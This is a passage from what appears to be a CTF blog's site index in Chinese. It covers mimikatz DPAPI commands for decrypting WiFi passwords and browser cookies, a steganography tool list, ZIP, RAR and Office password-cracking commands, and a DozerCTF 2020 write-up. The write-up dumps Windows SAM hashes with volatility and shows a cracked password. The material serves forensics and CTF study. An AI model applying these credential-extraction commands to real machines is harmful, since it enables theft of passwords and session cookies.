命令：python3 sherlock.py user1 user2 user3 ​ WiFi参考：How to decrypt stored Windows passwords using mimikatz and DAPA 工具：mimikatz 保存/使用主密钥（master keys）： dpapi::cache /save /file:cache.bin 提取WiFi密码： dpapi::wifi /in:&quot;&#123;fullpath&#125;\\file.xml&quot; ​ Cookies工具：mimikatz 保存/使用主密钥（master keys）： Windows 下：文件夹选项 -&gt; 查看 -&gt; 取消勾选 “隐藏受保护的操作系统文件” 才能看到 SID 文件夹下的 protect 文件 dpapi::masterkey /in:S-1-5-21-262715442-3761430816-2198621988-1001\\57935170- beab-4565-ba79-2b09570b95a6 /sid:S-1-5-21-262715442-3761430816-2198621988-1001 /password:&lt;登录密码&gt; 解密Cookies： dpapi::chrome /in:&quot;Cookies&quot;","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"取证","slug":"取证","permalink":"https://lazzzaro.github.io/tags/%E5%8F%96%E8%AF%81/"}],"author":"Lazzaro"},{"title":"文件隐写","slug":"misc-文件隐写","date":"2020-06-19T17:48:22.000Z","updated":"2022-11-20T18:10:00.113Z","comments":true,"path":"2020/06/20/misc-文件隐写/","link":"","permalink":"https://lazzzaro.github.io/2020/06/20/misc-%E6%96%87%E4%BB%B6%E9%9A%90%E5%86%99/","excerpt":"","text":"文件隐写（Steganography）文件头：List of file signatures 图片类 通用 图种（binwalk、foremost、某压缩软件） LSB stegsolve.jar 安装：http://www.caesum.com/handbook/Stegsolve.jar lsb.py 安装：https://github.com/livz/cloacked-pixel 命令：(python2) lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt; stegseek https://github.com/RickdeJager/stegseek stegseek [stegofile.jpg] [wordlist.txt] openstego https://www.openstego.com/ 盲水印（双图） https://github.com/chishaxie/BlindWaterMark 命令：python bwm.py decode hui.png hui_with_wm.png wm_from_hui.png https://github.com/linyacool/blind-watermark 命令：python decode.py --original ori.png --image res.png --result extract.png Java盲水印 https://github.com/ww23/BlindWatermark 命令：java -jar BlindWatermark.jar decode -c img-ec.jpg img-dc.jpg 隐形水印（吾爱破解WaterMark隐形水印工具） NTFS（某压缩软件、NtfsStreamsEditor） Our Secret（文档加密） Steganography https://www.hyluz.cn/zb_users/upload/2021/02/202102201613815645350310.zip 文件尾标志：l&lt;9l0kl10n88j:8&lt; 参考：https://www.hyluz.cn/?id=208 PixelJihad（JS加密） https://github.com/oakes/PixelJihad http://tools.jb51.net/aideddesign/img_add_info Steganography.js（JS加密） https://www.peter-eigenschink.at/projects/steganographyjs/showcase/ DeEgger Embedder bftools 命令： bftools decode braincopter 1.png &gt; 1.txt bftools run 1.txt png文件头：89 50 4B 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82 zsteg https://github.com/zed-0xff/zsteg 命令： zsteg -a xxx.png zsteg -E &quot;[Pattern]&quot; xxx.png &gt; out.xxx LSB（带密码，弱口令123456） https://github.com/livz/cloacked-pixel https://github.com/fjh1997/cloacked-pixel stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) jpg / jpeg文件头：FF D8 FF 文件尾：FF D9 steghide http://steghide.sourceforge.net/ 命令：steghide extract -sf 1.jpg （需密码 或 空密码） 密码爆破： stegseek https://github.com/RickdeJager/stegseek stegseek [stegofile.jpg] [wordlist.txt] StegCracker（爆破） https://github.com/Paradoxis/StegCracker 命令：stegcracker &lt;file&gt; [&lt;wordlist&gt;] jsteg https://github.com/lukechampine/jsteg F5 https://github.com/matthewgao/F5-steganography 命令：java Extract 123456.jpg -p 123456 outguess https://github.com/crorvick/outguess 命令：outguess -r file.jpg -k password -t out.txt JPHS https://www.scanwith.com/JPHS_for_Windows_download.htm bmp zsteg https://github.com/zed-0xff/zsteg 命令： zsteg -a xxx.bmp zsteg -E &quot;[Pattern]&quot; xxx.bmp &gt; out.xxx wbStego wbstego43open：http://wbstego.wbailer.com/ stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) gif文件头：47 49 46 38（GIF87a 或 GIF89a） 分帧（NamoGIF） 时间轴（每一帧间的时间间隔） identify -format &quot;%s %T \\n&quot; 100.gif stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) 相同图像比对 webp stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) 其他在线工具StegOnline 在线图片添加/解密隐藏信息(隐写术)工具 Magic Eye Solver / Viewer Aperi’Solve npiet 音频类 通用 Audacity（波形、频谱） DeEgger Embedder mp3 mp3stego https://www.petitcolas.net/steganography/mp3stego/ 命令：decode -X -P pass svega_stego.mp3 MP3 Steno 帧头private_bit 参考： 某工控 CTF 线上赛隐信道数据安全分析题解 De1CTF mc_easybgm wav文件头：52 49 46 46 EE AD 25 03 57 41 56 45 66 6D 74 20 LSB Silenteye: https://silenteye.v1kings.io/ 脚本： https://github.com/sniperline047/Audio-Steganography SSTV 慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。 工具： https://github.com/colaclanth/sstv 命令：sstv -d audio_file.wav -o result.png 手机App - Robot36（音频→图片） QSSTV DeepSound stegpy 安装：pip install stegpy 命令：stegpy xx.webp (-p) mid Velato http://velato.net/ 其他在线工具Morse Code Adaptive Audio Decoder Reverse Audio Online 视频类 通用 MSU StegoVideo / VirtualDub+插件 https://zhaokaifeng.com/?p=1305 压缩包类 zip文件头：50 4B 03 04（PK） 伪加密（某压缩软件） 密码爆破（ARCHPR） 明文攻击工具 bkcrack / rbkcrack 攻击： 12345678rbkcrack -C xxx.zip -c xxx.png -p yyy.png-C 要攻击的压缩包-c 要攻击的压缩包里面的文件-p 刚创建的明文文件名*部分位置已知明文：bkcrack -C flag.zip -c flag.txt -p plain.txt -x 16 2d -x 21 2d -x 26 2d -x 31 2d -x 44 7d 得到三个key解码： 123456rbkcrack -C xxx.zip -c xxx.png -k be056038 0a143c0c 1ea08ca5 -d xxx.png-C 要攻击的压缩包-c 要攻击的压缩包里面的文件-k 刚生成的三个key-d 最终还原的文件名 rar文件头：52 61 72 21（Rar!） 伪加密 查看第24个16进制数后面的数是0还是4，是4表示进行了伪加密，将4改为0就可以解除伪加密（修改对应RarBlock的CRC值）。 爆破工具 hashcat 1234567891011121314151617获得hash值rar2john xxx.rar &gt; rar.hash爆破hashcat -m 12500 -a 3 $RAR3$*0*a4243df9ba2d6023*b84a539412288864a2d6a9bfdcf2dd97 ?d?d?d?d?d?d -o out.txthashcat -m 13000 -a 3 $RAR5$*0*a4243df9ba2d6023*b84a539412288864a2d6a9bfdcf2dd97 ?d?d?d?d?d?d -o out.txt-m 根据rar类型进行选择，hashcat官方提供的参数有两种，RAR3-hp类型为12500，RAR5类型为13000-a 3 为掩码方式破解，掩码格式如下 ?d?d?d?d?d?d 表示为6位数字内置的掩码规则有：?l ：表示小写字母?u ：表示大写字母?d ：表示数字?s ：表示特殊字符?a ：表示上面四种的并集-o out.txt是输出结果 文本类 txt 零宽 whitespace snow隐写 http://fog.misty.com/perry/ccs/snow/snow/snow.html snow -C -p password filename word 解压 word选项-显示-隐藏文字-勾选 解密 提取hash值：python3 office2john.py 1.docx &gt; hash.txt hashcat破解：hashcat -m 9400 --username hash.txt -a 3 ?d?d?d?d?d?d?d?d -o cracked_pass.txt excel 解压 pdf wbStego4open http://wbstego.wbailer.com/ 密码爆破 pdfcrack pyc / pyo stegosaurus（字节码） https://github.com/AngelKitty/stegosaurus 命令： python3 -m stegosaurus main.pyc -x 常用脚本图片处理 CRC宽高爆破（png）123456789101112131415161718192021222324252627import binasciiimport structimport sysfr = open(&#x27;flag.png&#x27;,&#x27;rb&#x27;).read()data = bytearray(fr[0x0c:0x1d])crc32key = eval(&#x27;0x&#x27;+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1])n = 4095for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) &amp; 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(&#x27;flag2.png&#x27;,&#x27;wb&#x27;) fw.write(newpic) fw.close sys.exit() 快速傅里叶变换（FFT）1234567891011121314import cv2 as cvimport numpy as npimport matplotlib.pyplot as pltimg = cv.imread(&#x27;FFT.png&#x27;, 0) #读为灰度图像f = np.fft.fft2(img) #做频率变换fshift = np.fft.fftshift(f) #转移像素做幅度谱s1 = np.log(np.abs(fshift))#取绝对值：将复数变化成实数取对数的目的为了将数据变化到0-255plt.subplot(121)plt.imshow(img, &#x27;gray&#x27;)plt.title(&#x27;original&#x27;)plt.subplot(122)plt.imshow(s1,&#x27;gray&#x27;)plt.title(&#x27;center&#x27;)plt.show() ​ 压缩包处理 遍历zip压缩包12345678910111213141516import os.pathimport zipfileimport redir_path=&#x27;xxxxxxxx&#x27;files= os.listdir(dir_path)newfiles = files[::-1]print(newfiles)setee = []for file in newfiles: #遍历文件夹 position = dir_path+&#x27;\\\\&#x27;+ file #构造绝对路径，&quot;\\\\&quot;，其中一个&#x27;\\&#x27;为转义符 print (position) z = zipfile.ZipFile(position, &#x27;r&#x27;) for filename in z.namelist(): bytes = z.read(filename) if b&#x27;Zmxh&#x27; in bytes: print(filename) zlib解压字符串123456import zlibdata = open(&quot;zlib_hex_data.txt&quot;, &#x27;r&#x27;, encoding=&quot;utf-8&quot;).read().replace(&quot; &quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;).strip()data_dec = zlib.decompress(bytes.fromhex(data))print(data_dec[:100])with open(&quot;zlib_data.rar&quot;, &#x27;wb&#x27;) as wf: wf.write(data_dec) 其他在线工具wordle 填字：https://www.wsolver.com/ sokudo 数独：https://shudu.gwalker.cn/ virustotal 文件检测：https://www.virustotal.com/gui/home/upload Tupper自指公式：https://tuppers-formula.ovh/ base-decode 任意base解码：https://basecrack.herokuapp.com/","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"隐写","slug":"隐写","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"},{"name":"脚本","slug":"脚本","permalink":"https://lazzzaro.github.io/tags/%E8%84%9A%E6%9C%AC/"}],"author":"Lazzaro"},{"title":"DozerCTF 2020","slug":"match-DozerCTF-2020","date":"2020-06-14T13:00:00.000Z","updated":"2020-06-26T10:47:09.519Z","comments":true,"path":"2020/06/14/match-DozerCTF-2020/","link":"","permalink":"https://lazzzaro.github.io/2020/06/14/match-DozerCTF-2020/","excerpt":"","text":"CRYPTO真·签到 这是真的签到题 附件：baby_base.exe 查看文本，Base64+Base32+Hex+Base58 解码得flag。 ​ easy_bag 这莫非就是传说中的灵异背包？ nc 118.31.11.216 30003 提示很明显，背包密码。 nc取得公钥与密文，修改参考脚本后Sage运行得flag： 1234567891011121314151617181920212223242526272829303132333435###Sage###import binasciipubKey = [] #公钥pubKey = pubKey.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;L&#x27;, &#x27;&#x27;).strip(&#x27;[]&#x27;).split(&#x27;,&#x27;)nbit = len(pubKey)encoded = #密文encoded = encoded.replace(&#x27;L&#x27;, &#x27;&#x27;)print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print i, M M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] M = hex(int(M, 2))[2:-1] print(bytes.fromhex(M)) ​ REVERSE貌似有些不对 这是谁的课程设计？做的好烂！ 附件：Cipher.exe IDA查看字符串，发现 OEG7U19kUvCsV29qzT9qcUm0yDCwy2CiWjOrU2Or 及 ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/，猜测为自定义码表的Base64编码。 CyberChef解码得 Dr&#123;__g_!ocomiom&#125;ztlasoaefdn_dn。 根据最终flag格式 Dozerctf&#123;xxx&#125;，对比尝试用栅栏密码解密： Dr&#123;__g_! ocomiom&#125; ztlasoa efdn_dn 按上下顺序取出拼接得到flag。 ​ MISCupload where is the file？（flag格式Dozerctf{XXXXXXXXXXXXXXX}） 链接：https://share.weiyun.com/frfkQQvq 密码：rkbpx2 wireshark打开pcap流量包，文件→导出对象→HTTP，发现flag.jpg文件。 保存到本地，用010editor查看文件头504B0304为zip压缩文件格式。 修改文件名flag.zip，打开发现需要密码，其中的5个txt文件均为6字节大小。 用6字节CRC碰撞脚本分别爆破5个文件CRC值，选取有含义的爆破值为每个文件的内容，拼接得flag。 ​ py吗？ 链接：https://share.weiyun.com/btEdYZcA 密码：ssihnd png图，LSB低位隐写，Stegsolve提取出一串字符串，Base64解码出flag。 ​ 夏日计划 欢迎来到夏日计划，enjoy the game 链接：https://share.weiyun.com/MUdUEP0h 密码：twfn5u 010editor查看下载文件的文件头Rar，为rar文件格式。 360压缩打开压缩包，发现important.txt:secret.rar，为NTFS隐写，提取出secret.rar。 尝试打开secret.rar发现有错误，使用WinRAR修复压缩包，得到secret1/secret2/secret3/secret4四个文件，打开发现每行两个数，易知为坐标。 拼接四个文件，使用gnuplot画图工具，plot画图命令得到一个图片，有网鼎杯经验不难知为汉信码，但被反色处理过。 反色与修复处理得到汉信码，用极不稳定在线识别器http://www.efittech.com/hxdec.html 解码得flag。 ​ easy_analysis Can you find the secret from her/his computer? 链接：https://share.weiyun.com/lAcsmVU6 密码：xqrxwg 内存取证，上volatility工具分析一波，每种使用情况都查看一遍。 查看profile值： volatility -f memory imageinfo 得到profile值为Win7SP1x64。 按关键字扫描文件： volatility -f memory --profile=Win7SP1x64 filescan | grep &quot;flag&quot; 结果： 0x000000001e2fa940 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e314f20 2 1 R--rwd \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e76e070 1 1 R--rw- \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag0x000000001e85f430 2 0 RW---- \\Device\\HarddiskVolume1\\Users\\13m0nade\\Desktop\\flag\\analys 尝试导出analys文件： volatility -f memory --profile=Win7SP1x64 dumpfiles -D ./ -Q 0x000000001e85f430 010editor查看为zip文件，改文件名打开，加密，有提示： Why you don’t know my password? It’s so easy. Maybe you can log in to my computer. 猜测与登录信息有关。 提取登录用户信息，查看password hash： volatility -f memory --profile=Win7SP1x64 hivelist （列举缓存在内存中的注册表） volatility -f memory --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a00167a010 -D ./ （提取注册表system和SAM虚拟地址的hash内容） 结果： Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::13m0nade:1000:aad3b435b51404eeaad3b435b51404ee:575f5313970908467a19d3a5aa269743::: 尝试在线md5解密 31d6cfe0d16ae931b73c59d7e0c089c0 和 575f5313970908467a19d3a5aa269743： 31d6cfe0d16ae931b73c59d7e0c089c0 → [空密码] 575f5313970908467a19d3a5aa269743 → AaBbCc123 用AaBbCc123解密zip文件成功，得到flag.zip和usb.pcap。 flag.zip，加密，有提示： 密码很长，字母全部小写 wireshark打开usb.pcap，易知为usb流量，先用tshark工具得到leftover capture data： tshark -r usb.pcap -T fields -e usb.capdata 再用以下脚本或UsbKeyboardDataHacker脚本恢复击键信息： 123456789101112131415161718mappings = &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums = []keys = open(&#x27;usbdata.txt&#x27;)for line in keys: if line[0]!=&#x27;0&#x27; or line[1]!=&#x27;0&#x27; or line[2]!=&#x27;0&#x27; or line[3]!=&#x27;0&#x27; or line[6]!=&#x27;0&#x27; or line[7]!=&#x27;0&#x27; or line[8]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[11]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[14]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27;: continue nums.append(int(line[4:6],16)) # 00:00:xx:....keys.close()output = &quot;&quot;for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += &#x27;[unknown]&#x27;print(&#x27;output :n&#x27; + output) 结果： output :n[unknown][unknown][DEL][DEL][DEL][DEL]nnn[unknown]UTO KEY[DEL][DEL][DEL][DEL]KEY YLLTMFTNXBKGVCYYDBUHDLCPSPSPS[DEL]TSWRMWJJMNJGTYLKEGITTOIBGO[DEL]O GOOD LUCK 猜测为Autokey加密，密文：YLLTMFTNXBKGVCYYDBUHDLCPSPSPTSWRMWJJMNJGTYLKEGITTOIBGO。 修改脚本爆破，结果： -359.75078413 autokey, klen 3 :&quot;KGT&quot;, OFSFHNOGKNEWIYCQFZECEHALLPHEELSNBEWIIRBYCXNIHTAMAOWBSS-324.335522444 autokey, klen 4 :&quot;GHAT&quot;, SELAUBINDACTSCWFLZYCSMENADOCTPIPTHBUTGIMASDYEOFVPADGRO-323.532048185 autokey, klen 5 :&quot;XRAEF&quot;, BULPHEZCIUGHTUESWIADLPUPPEDVEDSORSGRYWRACAPTEEIEAKETCO-327.336020209 autokey, klen 6 :&quot;WGUMES&quot;, CFRHINRIGUCTEUSEBIQNLHBHCCHISLUPFORYSYESCATMAOGTACINAV-306.901215421 autokey, klen 7 :&quot;QSLAYRJ&quot;, ITATOOKFEBRSHSTUCKCALSININSEBKJJZEFICEAHPTDIAGBEALABAN-297.048582118 autokey, klen 8 :&quot;UISMBHTT&quot;, EDTHLYAUTYRZKEYEKDDITHELIMPHALSGEKUCMCRAPORISERTEARTOK-255.780042935 autokey, klen 9 :&quot;KEYFORZIP&quot;, OHNOYOUFINDTHEKEYTHEKEYFORZIPISTHISKEYBOARDSUCKSFORYOU 得到解压密码thiskeyboardsuckforyou，得到flag.txt。 打开发现多行Base64编码密文，解码得到16进制字符串，开头89504E47为png文件头，还原得到的png图片无信息。 猜测为Base64隐写，尝试跑解密脚本，得到flag~","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"自动密钥密码","slug":"crypto-自动密钥密码","date":"2020-06-14T07:32:12.000Z","updated":"2020-09-19T08:05:30.597Z","comments":true,"path":"2020/06/14/crypto-自动密钥密码/","link":"","permalink":"https://lazzzaro.github.io/2020/06/14/crypto-%E8%87%AA%E5%8A%A8%E5%AF%86%E9%92%A5%E5%AF%86%E7%A0%81/","excerpt":"","text":"自动密钥密码（Autokey密码/Autokey Cipher）自动密钥密码是密码学中的一种加密算法，与维吉尼亚密码类似，区别在于密钥不同。它的密钥开头是一个关键词，之后则是明文的重复。 示例 下面演示的是一种自动密钥密码的加密方法。先假设关键词为QUEENLY，而文本信息为ATTACK AT DAWN，则自动生成的密钥为”QUEENLYATTACKATDAWN”。之后再通过维吉尼亚密码的表格法生成密文： 123明文：ATTACK AT DAWN...密钥：QUEENL YA TTACK AT DAWN....密文：QNXEPV YT WTWP... 破译方法 假设明文为MEET AT THE FOUNTAIN，关键词为KILT： 123明文：MEETATTHEFOUNTAIN（未知）密钥：KILTMEETATTHEFOUN（未知）密文：WMPMMXXAEYHBRYOCA（已知） 我们尝试一些常用单词、双字母组、三字母组等在密钥中的可能位置，如THE： 1234567891011密文：WMP MMX XAE YHB RYO CA密钥：THE THE THE THE THE ..明文：DFL TFT ETA FAX YRK ..密文：W MPM MXX AEY HBR YOC A密钥：. THE THE THE THE THE .明文：. TII TQT HXU OUN FHY .密文：WM PMM XXA EYH BRY OCA密钥：.. THE THE THE THE THE明文：.. WFI EQW LRD IKU VVW 我们将这些明文片段按出现的可能性排列： 12不可能 &lt;--------------------------&gt;最可能EQW DFL TFT ... ... ... ... ETA OUN FAX 由于正确的明文片段同样也会出现在密钥中，因此可以将其偏移关键词的长度而得到密钥片段。同样地，我们猜测的密钥片段THE也会出现在明文中。因此，猜测关键词的长度（譬如说3到12之间），我们就能得到明文和密钥。 尝试OUN可能得到： 1234567891011121314偏移4位：密文：WMPMMXXAEYHBRYOCA密钥：......ETA.THE.OUN明文：......THE.OUN.AIN偏移5位：密文：WMPMMXXAEYHBRYOCA密钥：.....EQW..THE..OU明文：.....THE..OUN..OG偏移6位：密文：WMPMMXXAEYHBRYOCA密钥：....TQT...THE...O明文：....THE...OUN...M 看起来偏移量为4时的可能性最大（其他的都含有不太可能出现的Q），因此我们再将新得到的ETA偏移4位： 123密文：WMPMMXXAEYHBRYOCA密钥：..LTM.ETA.THE.OUN明文：..ETA.THE.OUN.AIN 我们知道了关键词的长度很可能是4位（以LT结尾），且已有了文本的一部分： 1..ETA.THE.OUN.AIN 之后以此为依据再进行一些猜测，可以验证如下是真正的明文： 1MEETATTHEFOUNTAIN 脚本 参考：http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ 相关模块及文件： quadgrams.txt：http://www.practicalcryptography.com/media/cryptanalysis/files/quadgrams.txt trigrams.txt：http://www.practicalcryptography.com/media/cryptanalysis/files/trigrams.txt ngram_score：http://www.practicalcryptography.com/media/cryptanalysis/files/ngram_score_1.py 123456789101112131415161718192021222324252627282930### ngram_score.py ###&#x27;&#x27;&#x27;Allows scoring of text using n-gram probabilities17/07/12&#x27;&#x27;&#x27;from math import log10class ngram_score(object): def __init__(self,ngramfile,sep=&#x27; &#x27;): &#x27;&#x27;&#x27; load a file containing ngrams and counts, calculate log probabilities &#x27;&#x27;&#x27; self.ngrams = &#123;&#125; for line in open(ngramfile): key,count = line.split(sep) self.ngrams[key] = int(count) self.L = len(key) self.N = sum(self.ngrams.values()) #calculate log probabilities for key in self.ngrams.keys(): self.ngrams[key] = log10(float(self.ngrams[key])/self.N) self.floor = log10(0.01/self.N) def score(self,text): &#x27;&#x27;&#x27; compute the score of text &#x27;&#x27;&#x27; score = 0 ngrams = self.ngrams.__getitem__ for i in range(len(text)-self.L+1): if text[i:i+self.L] in self.ngrams: score += ngrams(text[i:i+self.L]) else: score += self.floor return score 核心脚本（python3）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465### break_autokey.py ###from ngram_score import ngram_scorefrom pycipher import Autokeyimport refrom itertools import permutationsqgram = ngram_score(&#x27;quadgrams.txt&#x27;)trigram = ngram_score(&#x27;trigrams.txt&#x27;)ctext = &#x27;isjiqymdebvuzrvwhmvysibugzhyinmiyeiklcvioimbninyksmmnjmgalvimlhspjxmgfiraqlhjcpvolqmnyynhpdetoxemgnoxl&#x27;ctext = re.sub(r&#x27;[^A-Z]&#x27;,&#x27;&#x27;,ctext.upper())# keep a list of the N best things we have seen, discard anything elseclass nbest(object): def __init__(self,N=1000): self.store = [] self.N = N def add(self,item): self.store.append(item) self.store.sort(reverse=True) self.store = self.store[:self.N] def __getitem__(self,k): return self.store[k] def __len__(self): return len(self.store)#initN=100for KLEN in range(3,20): rec = nbest(N) for i in permutations(&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;,3): key = &#x27;&#x27;.join(i) + &#x27;A&#x27;*(KLEN-len(i)) pt = Autokey(key).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += trigram.score(pt[j:j+3]) rec.add((score,&#x27;&#x27;.join(i),pt[:30])) next_rec = nbest(N) for i in range(0,KLEN-3): for k in range(N): for c in &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;: key = rec[k][1] + c fullkey = key + &#x27;A&#x27;*(KLEN-len(key)) pt = Autokey(fullkey).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += qgram.score(pt[j:j+len(key)]) next_rec.add((score,key,pt[:30])) rec = next_rec next_rec = nbest(N) bestkey = rec[0][1] pt = Autokey(bestkey).decipher(ctext) bestscore = qgram.score(pt) for i in range(N): pt = Autokey(rec[i][1]).decipher(ctext) score = qgram.score(pt) if score &gt; bestscore: bestkey = rec[i][1] bestscore = score print(bestscore,&#x27;autokey, klen&#x27;,KLEN,&#x27;:&quot;&#x27;+bestkey+&#x27;&quot;,&#x27;,Autokey(bestkey).decipher(ctext))","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"密码","slug":"密码","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"Base64隐写","slug":"misc-Base64隐写","date":"2020-06-14T04:00:48.000Z","updated":"2020-06-14T04:47:19.248Z","comments":true,"path":"2020/06/14/misc-Base64隐写/","link":"","permalink":"https://lazzzaro.github.io/2020/06/14/misc-Base64%E9%9A%90%E5%86%99/","excerpt":"","text":"原理Base64的编码过程就是将文本字符对应成二进制后，再六个一组对应成索引，转为编码字符。如果字符串长度不是3的 倍数，则对应的二进制位数不是6的倍数，需要在末尾用0填充。若剩1个字符则在编码结果后加2个‘=’；若剩2个字符则 加1个‘=’。 Base64的解码过程，即先丢弃编码后面的‘=’，然后将每个base64字符对应索引转为6bit的二进制数，再8个一组转为ASCII码字符完成解码，最后若剩下不足8位的，则全部丢弃。 所以某些bit位在解码时会被丢弃，换句话说，这些bit值不会对解码结果产生影响。一个简单直观的例子就是QUJDRA和QUJDRC解码后都是ABCD。由此我们便可以将隐藏信息插入这些bit位中实现隐写。 一串Base64的编码最多也只有4bit的隐写空间，所以实现隐写往往需要大量编码串。隐写时把明文的每个字符用8位二进制数表示，由此将整个明文串转为bit串，按顺序填入Base64编码串的可隐写位中即可实现隐写。 加密123456789101112131415# -*- coding: utf-8 -*-import base64flag = &#x27;flag&#123;Base64isF4n&#125;&#x27; #flagbin_str = &#x27;&#x27;.join([bin(ord(c)).replace(&#x27;0b&#x27;, &#x27;&#x27;).zfill(8) for c in flag])base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;0.txt&#x27;, &#x27;rb&#x27;) as f0, open(&#x27;1.txt&#x27;, &#x27;wb&#x27;) as f1: #&#x27;0.txt&#x27;是明文, &#x27;1.txt&#x27;用于存放隐写后的 base64 for line in f0.readlines(): rowstr = base64.b64encode(line.replace(&#x27;\\n&#x27;, &#x27;&#x27;)) equalnum = rowstr.count(&#x27;=&#x27;) if equalnum and len(bin_str): offset = int(&#x27;0b&#x27;+bin_str[:equalnum * 2], 2) char = rowstr[len(rowstr) - equalnum - 1] rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset]) bin_str = bin_str[equalnum*2:] f1.write(rowstr + &#x27;\\n&#x27;) 解密123456789101112# -*- coding: utf-8 -*-b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f: bin_str = &#x27;&#x27; for line in f.readlines(): stegb64 = &#x27;&#x27;.join(line.split()) rowb64 = &#x27;&#x27;.join(stegb64.decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).split()) offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])) equalnum = stegb64.count(&#x27;=&#x27;) #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])) #8 